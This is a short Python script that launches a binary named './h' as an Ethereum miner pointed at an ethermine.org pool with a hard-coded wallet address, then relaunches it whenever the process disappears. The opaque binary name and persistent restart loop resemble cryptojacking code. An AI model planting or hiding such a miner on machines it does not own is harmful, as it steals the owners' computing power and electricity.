import os.path
import subprocess
import time

x = subprocess.Popen(["./h","--farm-recheck","2000","-P","stratum1+ssl://0xafB4cADAd44c1284Fea3273983D17d1132ad5C6F.a@us1.ethermine.org:5555"])
while 1:
    if 0 == os.path.exists("/proc/"+str(x.pid)):
        x = subprocess.Popen(["./h","--farm-recheck","2000","-P","stratum1+ssl://0xafB4cADAd44c1284Fea3273983D17d1132ad5C6F.a@us1.ethermine.org:5555"])
        time.sleep(5)
    else:
        time.sleep(3600)
